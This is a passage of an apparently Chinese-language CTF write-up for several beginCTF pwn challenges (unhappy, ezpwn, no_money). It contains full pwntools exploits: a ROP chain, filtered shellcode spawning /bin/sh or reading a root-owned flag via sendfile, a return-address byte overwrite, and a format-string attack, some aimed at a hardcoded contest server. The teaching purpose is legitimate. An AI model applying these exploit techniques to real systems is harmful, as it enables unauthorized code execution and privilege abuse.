add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471267</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401ce4</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'This is a fake(real) checkin problem.'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于程序中有<code>close</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"Welcome to beginCTF!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"This is a fake(real) checkin problem."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">512LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">2LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以getshell以后还需要重定向标准输出，输入<code>exec 1&gt;&amp;0</code>即可</p><blockquote><p><strong>exec</strong></p><ol><li>代替<code>shell</code>执行命令，区别是<code>shell</code>执行完之后会回到<code>shell</code>，而<code>exec</code>会直接退出。</li><li>文件重定向，也就是<code>exec 1&gt;&amp;0</code>这样将文件描述符为<code>1</code>的文件重定向到<code>0</code>上</li></ol><p>标准输出<code>(close(1))</code>和标准错误<code>(close(2))</code>，有<code>shell</code>但获得不了输出,可以通过<code>exec 1&gt;&amp;0</code>重定向</p></blockquote><h2 id="unhappy"><a href="#unhappy" class="headerlink" title="unhappy"></a>unhappy</h2><p>这题就是写shellcode，但是shellcode里不能含有HAPYhapy</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-10h]</span>  addr <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0xFFF00000LL</span><span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> addr <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1LL</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"mmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">check</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>addr<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">munmap</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"munmap failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">check</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Bh] [rbp-5h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-4h]</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    result <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token char">'h'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'a'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'p'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'y'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'H'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'A'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'P'</span> <span class="token operator">||</span> v2 <span class="token operator">==</span> <span class="token char">'Y'</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>推荐一个网站<a href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">https://shell-storm.org/online/Online-Assembler-and-Disassembler/</a></p><p>要在限制下写的话可以利用<code>sub</code>和<code>add</code>去凑出要实现的代码，比如<code>add rdi,0x61</code>，可以写成<code>add rdi， 0x60</code> <code>add rdi，0x1</code>，但是这题有一个简便的方法就是输入<code>shellcode</code>来执行<code>read</code>，通过<code>syscall</code>调用的<code>read</code>就没有了<code>check</code>的限制，但是第二次输入需要先<code>sleep</code>停顿一下</p><p>先试着用<code>execve(’/bin/sh’, 0,0)</code>来<code>getshell</code></p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">add <span class="token register variable">edi</span>, <span class="token number">0x30</span>mov dword ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token number">0x6e69622f</span>add <span class="token register variable">edi</span>, <span class="token number">0x4</span>mov dword ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token number">0x58732f2f</span>add dword ptr <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>, <span class="token number">0x10000000</span>sub <span class="token register variable">edi</span>,<span class="token number">0x4</span>mov <span class="token register variable">esi</span>, <span class="token number">0</span>mov <span class="token register variable">edx</span>, <span class="token number">0</span>mov <span class="token register variable">eax</span>,<span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打到远程会发现没有<code>cat flag</code>的权限，但是<code>unhappy</code>有<code>rws</code>权限，也就是执行<code>unhappy</code>有<code>root</code>权限，所以把<code>shellcode</code>改成<code>orw</code>即可，直接<code>write</code>会报错，这里也学习到了一个知识点：</p><blockquote><p><code>ssize_t sendfile(int out_fd,int in_fd,off_t* offset,size_t count);</code> <code>sendfile</code>函数在两个文件描述符之间直接传递数据（完全在内核中操作），从而避免了内核缓冲区和用户缓冲区之间的数据拷贝，效率很高，这被称为零拷贝</p></blockquote><p>最终exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span><span class="token number">31276</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'rsi'</span><span class="token punctuation">,</span> <span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">,</span> <span class="token string">'O_RDWR'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h2><p><code>test command</code>不能用<code>cat</code>和<code>sh</code>（官方<code>wp</code>指出<code>test command</code>对指令过滤不严，也可以利用<code>test command</code>），<code>test filename</code>不能输入<code>flag</code>，<code>teat data</code>功能是输入一个<code>index</code>，向数组该<code>index</code>处输入一个字符，而程序中有<code>shell</code>函数，所以调试一下计算返回地址到该数组之间的距离作为<code>index</code>，把返回地址地位改成<code>shell</code>函数低位即可，需要注意的是输入格式，行末要加回车不然会覆盖成回车</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">unsigned __int64 main_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>          puts<span class="token punctuation">(</span><span class="token string">"Please input index."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>          puts<span class="token punctuation">(</span><span class="token string">"please input value"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v1 <span class="token operator">=</span> getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          getchar<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          s<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">31180</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>gift <span class="token operator">=</span> <span class="token number">0x1849</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Input your choice.'</span><span class="token punctuation">,</span> <span class="token string">b'1\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Please input index.'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x228</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'please input value'</span><span class="token punctuation">,</span> <span class="token string">b'\x51'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Input your choice.'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="no-money"><a href="#no-money" class="headerlink" title="no_money"></a>no_money</h2><p>格式化字符串，但是禁用<code>$</code>，一般用<code>$</code>定位，本题中也学到一个知识点：<code>’%p’ * n + ‘%hn’ = ‘%n$hn’</code>,利用这一点，先泄露程序基址加上<code>shell</code>地址最后改返回地址低位为<code>shell</code>地址即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">31645</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Your payload:'</span><span class="token punctuation">,</span> <span class="token string">b'%p-%p-%p-%p-%p-%p'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x40</span>target <span class="token operator">=</span> <span class="token number">0x404C</span> <span class="token operator">+</span> codep <span class="token operator">=</span> <span class="token string">b'%255c'</span> <span class="token operator">+</span> <span class="token string">b'%p'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token string">b'%hhn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x60</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'payload:'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 